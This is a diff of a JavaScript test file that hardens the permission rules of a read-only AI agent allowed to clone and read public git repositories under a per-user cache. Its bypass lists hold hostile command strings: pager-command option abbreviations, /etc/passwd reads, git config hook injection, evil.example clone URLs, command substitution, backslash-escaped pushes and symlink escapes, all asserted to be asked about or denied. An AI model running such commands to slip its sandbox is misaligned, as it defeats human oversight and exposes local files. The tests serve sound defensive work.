@@ -1,6 +1,7 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
+import { mkdirSync, mkdtempSync, rmSync, statSync } from 'node:fs';
+import { chmod, mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { installPack, listPacks, validatePack } from '../src/packs.js';
@@ -18,11 +19,19 @@ async function scratch(t) {
   return { root, library: path.join(directory, 'home') };
 }
 
+// The librarian's root is per user, ~/.alp-librarian-cache: this file runs with a throwaway HOME, so no check here
+// creates anything in the real home (t-6dc5 G5-B round 2).
+const realHome = process.env.HOME;
+const HOME = mkdtempSync(path.join(tmpdir(), 'alp-research-home-'));
+process.env.HOME = HOME;
+test.after(() => { process.env.HOME = realHome; rmSync(HOME, { recursive: true, force: true }); });
+const CACHE = `${HOME}/.alp-librarian-cache`;
+
 const ADVISORS_OF_PACK = ['librarian', 'scout'];
 // The librarian's profile, as pack.json carries it and the install writes it (t-6dc5 G5-B).
 const LIBRARIAN = {
   base: 'read-only',
-  allow: ['Bash(@git-clone-public /tmp/alp-librarian)', 'Bash(@git-read /tmp/alp-librarian)', 'WebFetch(domain:github.com)', 'WebFetch(domain:raw.githubusercontent.com)', 'WebFetch(domain:gitlab.com)'],
+  allow: ['Bash(@git-clone-public ~/.alp-librarian-cache)', 'Bash(@git-read ~/.alp-librarian-cache)', 'WebFetch(domain:github.com)', 'WebFetch(domain:raw.githubusercontent.com)', 'WebFetch(domain:gitlab.com)'],
   ask: ['Bash(git clone:*)', 'Bash(git fetch:*)', 'Bash(git -C:*)', 'Bash(gh repo clone:*)'],
   deny: ['Bash(@git-unsafe)', 'Bash(git push:*)', 'Bash(rm:*)'],
 };
@@ -138,7 +147,7 @@ test('serving as a team advisor, librarian and scout stay read-only even when se
   }
 });
 
-// t-6dc5 G5-B: the librarian may clone and fetch public repositories into /tmp/alp-librarian, and read them
+// t-6dc5 G5-B: the librarian may clone and fetch public repositories into ~/.alp-librarian-cache, and read them
 // there, through checked rules (permissions.js coversChecked); everything else stays read-only or asks.
 async function librarianProfile(t) {
   const { root, library } = await scratch(t);
@@ -146,79 +155,79 @@ async function librarianProfile(t) {
   return { root, library, profile: await profileFor(root, library, 'librarian', { readOnly: true }) };
 }
 
-// Each was allowed by a prefix rule the old matcher could express (Bash(git -C /tmp/alp-librarian*), Bash(git clone:*),
+// Each was allowed by a prefix rule the old matcher could express (Bash(git -C <root>*), Bash(git clone:*),
 // Bash(git fetch:*)); with the hardened profile none of them is allowed.
 const BYPASSES = [
-  ['git -C /tmp/alp-librarian/../x push', 'deny'],
-  ['git -C /tmp/alp-librarian/../repo log', 'ask'],
-  ['git -C /tmp/alp-librarianX log', 'ask'],
+  [`git -C ${CACHE}/../x push`, 'deny'],
+  [`git -C ${CACHE}/../repo log`, 'ask'],
+  [`git -C ${CACHE}X log`, 'ask'],
   ['git fetch', 'ask'],
   ['git fetch origin', 'ask'],
   ['git clone https://github.com/a/b', 'ask'],
   ['git clone https://github.com/a/b ./src', 'ask'],
-  ['git clone https://github.com/a/b /tmp/alp-librarian/../../workspace', 'ask'],
-  ['git clone https://github.com/a/b /tmp/alp-librarian//a-b', 'ask'],
-  ['git clone https://github.com/a/b /tmp/alp-librarian/./a-b', 'ask'],
-  ['git clone https://github.com/a/b /tmp/alp-librarian/a-b/', 'ask'],
-  ['git clone https://github.com/a/b ~/alp-librarian/a-b', 'ask'],
-  ['git clone https://github.com/a/b /tmp/alp-librarian', 'ask'],
-  ['git clone https://evil.example/a/b /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone https://github.com.evil.example/a/b /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone https://user@github.com/a/b /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone git@github.com:a/b /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone ssh://git@github.com/a/b /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone file:///etc /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone /Users/me/project /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone --recurse-submodules https://github.com/a/b /tmp/alp-librarian/a-b', 'ask'],
-  ['git clone --template=/tmp/t https://github.com/a/b /tmp/alp-librarian/a-b', 'deny'],
-  ['git clone -u /tmp/evil https://github.com/a/b /tmp/alp-librarian/a-b', 'deny'],
-  ['git clone --upload-pack=/tmp/evil https://github.com/a/b /tmp/alp-librarian/a-b', 'deny'],
-  ['git clone -c core.fsmonitor=/tmp/evil https://github.com/a/b /tmp/alp-librarian/a-b', 'deny'],
-  ['git clone --config core.hooksPath=/tmp/h https://github.com/a/b /tmp/alp-librarian/a-b', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b -c core.sshCommand=x fetch', 'deny'],
-  ['git -c core.fsmonitor=x -C /tmp/alp-librarian/a-b log', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b fetch --upload-pack=/tmp/evil', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b fetch -u', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b fetch https://evil.example/x', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b fetch /Users/me/project', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b push', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b push origin main', 'deny'],
-  ['git --git-dir=/tmp/alp-librarian/a-b/.git push', 'deny'],
-  ['/usr/bin/git -C /tmp/alp-librarian/a-b push', 'deny'],
+  [`git clone https://github.com/a/b ${CACHE}/../../workspace`, 'ask'],
+  [`git clone https://github.com/a/b ${CACHE}//a-b`, 'ask'],
+  [`git clone https://github.com/a/b ${CACHE}/./a-b`, 'ask'],
+  [`git clone https://github.com/a/b ${CACHE}/a-b/`, 'ask'],
+  ['git clone https://github.com/a/b ~/.alp-librarian-cache/a-b', 'ask'],
+  [`git clone https://github.com/a/b ${CACHE}`, 'ask'],
+  [`git clone https://evil.example/a/b ${CACHE}/a-b`, 'ask'],
+  [`git clone https://github.com.evil.example/a/b ${CACHE}/a-b`, 'ask'],
+  [`git clone https://user@github.com/a/b ${CACHE}/a-b`, 'ask'],
+  [`git clone git@github.com:a/b ${CACHE}/a-b`, 'ask'],
+  [`git clone ssh://git@github.com/a/b ${CACHE}/a-b`, 'ask'],
+  [`git clone file:///etc ${CACHE}/a-b`, 'ask'],
+  [`git clone /Users/me/project ${CACHE}/a-b`, 'ask'],
+  [`git clone --recurse-submodules https://github.com/a/b ${CACHE}/a-b`, 'ask'],
+  [`git clone --template=/tmp/t https://github.com/a/b ${CACHE}/a-b`, 'deny'],
+  [`git clone -u /tmp/evil https://github.com/a/b ${CACHE}/a-b`, 'deny'],
+  [`git clone --upload-pack=/tmp/evil https://github.com/a/b ${CACHE}/a-b`, 'deny'],
+  [`git clone -c core.fsmonitor=/tmp/evil https://github.com/a/b ${CACHE}/a-b`, 'deny'],
+  [`git clone --config core.hooksPath=/tmp/h https://github.com/a/b ${CACHE}/a-b`, 'deny'],
+  [`git -C ${CACHE}/a-b -c core.sshCommand=x fetch`, 'deny'],
+  [`git -c core.fsmonitor=x -C ${CACHE}/a-b log`, 'deny'],
+  [`git -C ${CACHE}/a-b fetch --upload-pack=/tmp/evil`, 'deny'],
+  [`git -C ${CACHE}/a-b fetch -u`, 'deny'],
+  [`git -C ${CACHE}/a-b fetch https://evil.example/x`, 'ask'],
+  [`git -C ${CACHE}/a-b fetch /Users/me/project`, 'ask'],
+  [`git -C ${CACHE}/a-b push`, 'deny'],
+  [`git -C ${CACHE}/a-b push origin main`, 'deny'],
+  [`git --git-dir=${CACHE}/a-b/.git push`, 'deny'],
+  [`/usr/bin/git -C ${CACHE}/a-b push`, 'deny'],
   ['env GIT_DIR=x git push', 'deny'],
-  ["sh -c 'git -C /tmp/alp-librarian/a-b push'", 'deny'],
-  ['git -C /tmp/alp-librarian/a-b config core.hooksPath /tmp/h', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b remote set-url origin https://evil.example/x', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b hook run pre-commit', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b log --output=/Users/me/project/x', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b diff --no-index /etc/passwd /dev/null', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b grep -O x', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b branch -D main', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b checkout main', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b log && git push', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b log; git -C /tmp/alp-librarian/a-b push', 'deny'],
-  ['git -C /tmp/alp-librarian/a-b log | tee /tmp/x', undefined],
-  ['git -C /tmp/alp-librarian/a-b log > /Users/me/project/x', 'ask'],
-  ['git -C /tmp/alp-librarian/a-b log $(touch /tmp/x)', 'deny'],
-  ['gh repo clone a/b /tmp/alp-librarian/a-b', 'ask'],
+  [`sh -c 'git -C ${CACHE}/a-b push'`, 'deny'],
+  [`git -C ${CACHE}/a-b config core.hooksPath /tmp/h`, 'deny'],
+  [`git -C ${CACHE}/a-b remote set-url origin https://evil.example/x`, 'deny'],
+  [`git -C ${CACHE}/a-b hook run pre-commit`, 'deny'],
+  [`git -C ${CACHE}/a-b log --output=/Users/me/project/x`, 'ask'],
+  [`git -C ${CACHE}/a-b diff --no-index /etc/passwd /dev/null`, 'ask'],
+  [`git -C ${CACHE}/a-b grep -O x`, 'ask'],
+  [`git -C ${CACHE}/a-b branch -D main`, 'ask'],
+  [`git -C ${CACHE}/a-b checkout main`, 'ask'],
+  [`git -C ${CACHE}/a-b log && git push`, 'deny'],
+  [`git -C ${CACHE}/a-b log; git -C ${CACHE}/a-b push`, 'deny'],
+  [`git -C ${CACHE}/a-b log | tee /tmp/x`, undefined],
+  [`git -C ${CACHE}/a-b log > /Users/me/project/x`, 'ask'],
+  [`git -C ${CACHE}/a-b log $(touch /tmp/x)`, 'deny'],
+  [`gh repo clone a/b ${CACHE}/a-b`, 'ask'],
 ];
 const ALLOWED = [
-  'git clone --depth 50 https://github.com/a/b /tmp/alp-librarian/a-b',
-  'git clone https://gitlab.com/group/project.git /tmp/alp-librarian/project',
-  'git clone --filter=blob:none --single-branch -b v1.2 https://github.com/a/b.git /tmp/alp-librarian/a-b',
-  'git -C /tmp/alp-librarian/a-b fetch --depth 50',
-  'git -C /tmp/alp-librarian/a-b fetch origin main --tags',
-  'git -C /tmp/alp-librarian/a-b log -S x',
-  'git -C /tmp/alp-librarian/a-b log --oneline v1.0..v1.2 -- src/index.js',
-  'git -C /tmp/alp-librarian/a-b show HEAD:src/index.js',
-  'git -C /tmp/alp-librarian/a-b grep -n "createServer" -- lib',
-  'git -C /tmp/alp-librarian/a-b blame -L 10,20 src/index.js',
-  'git -C /tmp/alp-librarian/a-b rev-parse HEAD',
-  'git -C /tmp/alp-librarian/a-b branch -a',
-  "/bin/zsh -lc 'git -C /tmp/alp-librarian/a-b log -1 && git -C /tmp/alp-librarian/a-b rev-parse HEAD'",
+  `git clone --depth 50 https://github.com/a/b ${CACHE}/a-b`,
+  `git clone https://gitlab.com/group/project.git ${CACHE}/project`,
+  `git clone --filter=blob:none --single-branch -b v1.2 https://github.com/a/b.git ${CACHE}/a-b`,
+  `git -C ${CACHE}/a-b fetch --depth 50`,
+  `git -C ${CACHE}/a-b fetch origin main --tags`,
+  `git -C ${CACHE}/a-b log -S x`,
+  `git -C ${CACHE}/a-b log --oneline v1.0..v1.2 -- src/index.js`,
+  `git -C ${CACHE}/a-b show HEAD:src/index.js`,
+  `git -C ${CACHE}/a-b grep -n "createServer" -- lib`,
+  `git -C ${CACHE}/a-b blame -L 10,20 src/index.js`,
+  `git -C ${CACHE}/a-b rev-parse HEAD`,
+  `git -C ${CACHE}/a-b branch -a`,
+  `/bin/zsh -lc 'git -C ${CACHE}/a-b log -1 && git -C ${CACHE}/a-b rev-parse HEAD'`,
 ];
 
-test('the librarian clones and reads public repositories only below /tmp/alp-librarian; every bypass asks or is denied', async t => {
+test('the librarian clones and reads public repositories only below ~/.alp-librarian-cache; every bypass asks or is denied', async t => {
   const { profile } = await librarianProfile(t);
   assert.equal(profile.base, 'read-only');
   for (const [command, expected] of BYPASSES) assert.equal(commandDecision(profile, command), expected, command);
@@ -227,21 +236,117 @@ test('the librarian clones and reads public repositories only below /tmp/alp-lib
   for (const command of ['git log', 'git status', 'git diff', 'touch src/x.js', 'npm test']) assert.equal(commandDecision(profile, command), undefined, command);
 });
 
-test('a link below /tmp/alp-librarian that leads elsewhere is not below it', { skip: process.platform === 'win32' }, async t => {
+test('a link below the librarian root that leads elsewhere is not below it', { skip: process.platform === 'win32' }, async t => {
   const { profile } = await librarianProfile(t);
-  // A scratch root stands in for /tmp/alp-librarian: the rules are the shipped ones with another root.
+  // A scratch root stands in for ~/.alp-librarian-cache: the rules are the shipped ones with another root, mode 0700.
   const directory = await mkdtemp(path.join(tmpdir(), 'alp-librarian-link-'));
   t.after(() => rm(directory, { recursive: true, force: true }));
   const root = path.join(directory, 'clones');
   await mkdir(path.join(root, 'real'), { recursive: true });
+  await chmod(root, 0o700);
   await mkdir(path.join(directory, 'workspace'));
-  const { symlink } = await import('node:fs/promises');
   await symlink(path.join(directory, 'workspace'), path.join(root, 'escape'));
-  const scoped = { ...profile, allow: profile.allow.map(rule => rule.replace('/tmp/alp-librarian', root)) };
+  const scoped = { ...profile, allow: profile.allow.map(rule => rule.replace('~/.alp-librarian-cache', root)) };
   assert.equal(commandDecision(scoped, `git -C ${root}/real log`), 'allow');
   assert.equal(commandDecision(scoped, `git clone https://github.com/a/b ${root}/new`), 'allow');
   assert.equal(commandDecision(scoped, `git -C ${root}/escape log`), 'ask');
   assert.equal(commandDecision(scoped, `git clone https://github.com/a/b ${root}/escape/b`), 'ask');
+});
+
+// Round 2 (security review of PR #378, reproduced with git 2.54): git accepts unambiguous abbreviations of long options
+// and clusters of short ones, so a denylist let `grep --open-f=...` and `grep -iO<cmd>` run a pager command, and
+// options with a path value read files outside the clone. @git-read now takes only the options it lists, exactly.
+const OPTION_BYPASSES = [
+  "grep --open-f='touch /tmp/pwn #' hi", "grep --open='sh -c id' hi", 'grep --open-files-in-pager=touch hi', 'grep -iOtouch hi',
+  'grep -nOtouch hi', 'grep -O hi', 'grep -Otouch hi', 'grep -inO hi', 'grep --file=/etc/passwd', 'grep -f /etc/passwd', 'grep -if/etc/passwd',
+  'grep -e /etc/passwd', 'grep --no-index hi /etc', 'grep --no-ind hi', 'grep --recurse-submodules hi', 'grep --ext hi',
+  'blame --contents=/etc/passwd a.js', 'blame --contents /etc/passwd a.js', 'blame --cont=/etc/passwd a.js', 'blame --ignore-revs-file=/etc/passwd a.js',
+  'blame --ignore-revs-f=/x a.js', 'blame -S /etc/passwd a.js', 'ls-files --exclude-from=/etc/passwd', 'ls-files -X /etc/passwd', 'ls-files --exclude-f=/x',
+  'log --output=/tmp/x', 'log --out=/tmp/x', 'log --outp x', 'log --ext-diff', 'log --ext', 'log --textconv', 'log --textc', 'log --show-signature',
+  'log --name-on', 'log --one', 'log -O/etc/passwd -p', 'log -pO/etc/passwd', 'diff --no-index /etc/passwd /dev/null', 'diff --no-i /etc/passwd x',
+  'diff --orderfile=/etc/passwd', 'diff -O/etc/passwd', 'diff --relative=../x', 'show --output=x HEAD', 'show HEAD -- /etc/passwd',
+  'show --format=x --since=/etc', 'cat-file --textconv HEAD:a', 'cat-file --filters HEAD:a', 'cat-file --path=a HEAD', 'rev-parse --resolve-git-dir /etc',
+  'rev-parse --git-path x', 'log --end-of-options HEAD', 'log -- ../x', 'grep x -- ../../etc', 'log -L 1,2:../x',
+];
+const OPTION_READS = [
+  'log --oneline -n 20', 'log -5 --format=%H%x09%an%x09%s --since=2.weeks', 'log -p -S createServer -- src', 'log --stat --follow -- src/a.js',
+  'log -n5 --graph --decorate --all', 'log -L 10,20:src/a.js', 'log --author=someone --grep=fix -i', 'log -G foo -U5 --word-diff',
+  'grep -n -i -e foo -C 3 -- lib', 'grep -niw foo', 'grep -A3 -B 2 foo', 'grep -c foo', 'grep -l -E "a|b" -- src', 'grep --max-depth=2 --heading --break foo',
+  'blame -L 10,20 -w src/a.js', 'blame --porcelain -M -C50 src/a.js', 'show --stat HEAD', 'show HEAD~2:src/a.js', 'show --name-only --format=%H v1',
+  'diff --name-only v1..v2', 'diff -M50% --stat v1 v2 -- src', 'diff --cached', 'ls-files -z', "ls-files --cached --format='%(path)'", 'cat-file -p HEAD',
+  'cat-file -t HEAD', 'rev-parse --abbrev-ref HEAD', 'rev-parse --short=8 HEAD', 'rev-parse --show-toplevel',
+];
+
+test('@git-read allows only the options it lists, exactly: no abbreviation, cluster or path option leaves the clone', { skip: process.platform === 'win32' }, async t => {
+  const { profile } = await librarianProfile(t);
+  const directory = await mkdtemp(path.join(tmpdir(), 'alp-librarian-options-'));
+  t.after(() => rm(directory, { recursive: true, force: true }));
+  const root = path.join(directory, 'clones');
+  await mkdir(path.join(root, 'a-b'), { recursive: true, mode: 0o700 });
+  await chmod(root, 0o700);
+  const scoped = { ...profile, allow: profile.allow.map(rule => rule.replace('~/.alp-librarian-cache', root)) };
+  for (const args of OPTION_BYPASSES) assert.equal(commandDecision(scoped, `git -C ${root}/a-b ${args}`), 'ask', args);
+  for (const args of OPTION_READS) assert.equal(commandDecision(scoped, `git -C ${root}/a-b ${args}`), 'allow', args);
+  // A path inside the clone may be named absolutely.
+  assert.equal(commandDecision(scoped, `git -C ${root}/a-b log -- ${root}/a-b/src`), 'allow');
+  assert.equal(commandDecision(scoped, `git -C ${root}/a-b grep --max-depth=${root}/x foo`), 'ask');
+});
+
+test('the librarian root is per user: ~/ is the home ALP runs as, created 0700 by the first clone, refused when another could reach it', { skip: process.platform === 'win32' }, async t => {
+  const { profile } = await librarianProfile(t);
+  const clone = target => commandDecision(profile, `git clone https://github.com/a/b ${target}`);
+  const read = target => commandDecision(profile, `git -C ${target} log --oneline`);
+  // Missing root: a read is not allowed, the first clone creates the root 0700 before git runs, so no one can put
+  // a directory or link of theirs there between ALP's check and git's write.
+  rmSync(CACHE, { recursive: true, force: true });
+  assert.equal(read(`${CACHE}/a-b`), 'ask');
+  assert.equal(clone(`${CACHE}/a-b`), 'allow');
+  const made = statSync(CACHE);
+  assert.ok(made.isDirectory());
+  assert.equal(made.mode & 0o777, 0o700);
+  assert.equal(made.uid, process.getuid());
+  assert.equal(read(`${CACHE}/a-b`), 'allow');
+
+  // Scratch roots stand in for a root another user squatted or swapped (only root may chown, so a squatted root
+  // here is one this user does not hold as 0700: open to others, a link, or a file).
+  const directory = await mkdtemp(path.join(tmpdir(), 'alp-librarian-root-'));
+  t.after(() => rm(directory, { recursive: true, force: true }));
+  const scoped = root => ({ ...profile, allow: profile.allow.map(rule => rule.replace('~/.alp-librarian-cache', root)) });
+  const decide = (root, command) => commandDecision(scoped(root), command);
+  const squatted = path.join(directory, 'squatted');
+  mkdirSync(squatted, { mode: 0o777 });
+  await chmod(squatted, 0o777);
+  const shared = path.join(directory, 'shared');
+  mkdirSync(shared);
+  await chmod(shared, 0o755);
+  const mine = path.join(directory, 'mine');
+  mkdirSync(mine, { mode: 0o700 });
+  const swapped = path.join(directory, 'swapped');
+  await symlink(mine, swapped);
+  const file = path.join(directory, 'file');
+  await writeFile(file, '');
+  const parent = path.join(directory, 'open');
+  mkdirSync(path.join(parent, 'root'), { recursive: true, mode: 0o700 });
+  await chmod(parent, 0o777);
+  await chmod(path.join(parent, 'root'), 0o700);
+  for (const root of [squatted, shared, swapped, file, path.join(parent, 'root')]) {
+    assert.equal(decide(root, `git clone https://github.com/a/b ${root}/a-b`), 'ask', root);
+    assert.equal(decide(root, `git -C ${root}/a-b log`), 'ask', root);
+  }
+  assert.equal(decide(mine, `git clone https://github.com/a/b ${mine}/a-b`), 'allow');
+  // A missing root whose parent is open to others is not created.
+  assert.equal(decide(path.join(parent, 'new'), `git clone https://github.com/a/b ${parent}/new/a-b`), 'ask');
+  // A rule names an absolute root or ~/<dir>, nothing else.
+  const files = { 'packs/x/agents/a/AGENT.md': '# A', 'packs/x/agents/a/agent.json': JSON.stringify({ mode: 'read-only' }) };
+  const pack = rule => validatePack('x', { label: 'X', description: 'x', agents: ['a'], permissions: { a: { base: 'read-only', allow: [rule] } } }, files);
+  assert.ok(pack('Bash(@git-read ~/.alp-librarian-cache)'));
+  for (const rule of ['Bash(@git-read ~)', 'Bash(@git-read ~/)', 'Bash(@git-read ~/../x)', 'Bash(@git-read ~user/x)', 'Bash(@git-read x)']) assert.throws(() => pack(rule), /a checked rule is/, rule);
+});
+
+test('the deny path reads a git command the way the shell will: escaping backslashes and quotes are taken out', async t => {
+  const { profile } = await librarianProfile(t);
+  for (const command of ['g\\it push', '\\git push', 'git pu\\sh $X', `git -C ${CACHE}/a-b pu\\sh origin`, "g'i't push $X", 'git -c\\ core.x=y log $X'])
+    assert.equal(commandDecision(profile, command), 'deny', command);
 });
 
 test('the librarian stays read-only under a full-access parent and settings that try to widen it', async t => {
@@ -251,8 +356,8 @@ test('the librarian stays read-only under a full-access parent and settings that
   assert.equal(profile.base, 'read-only');
   assert.equal(profile.cappedFrom, 'full-access');
   // Its rules still hold under the cap: push is denied, the checked clone allowed.
-  assert.equal(commandDecision(profile, 'git -C /tmp/alp-librarian/a-b push'), 'deny');
-  assert.equal(commandDecision(profile, 'git clone https://github.com/a/b /tmp/alp-librarian/a-b'), 'allow');
+  assert.equal(commandDecision(profile, `git -C ${CACHE}/a-b push`), 'deny');
+  assert.equal(commandDecision(profile, `git clone https://github.com/a/b ${CACHE}/a-b`), 'allow');
 });
 
 test('a pack may give a read-only agent rules, never a wider base', async () => {
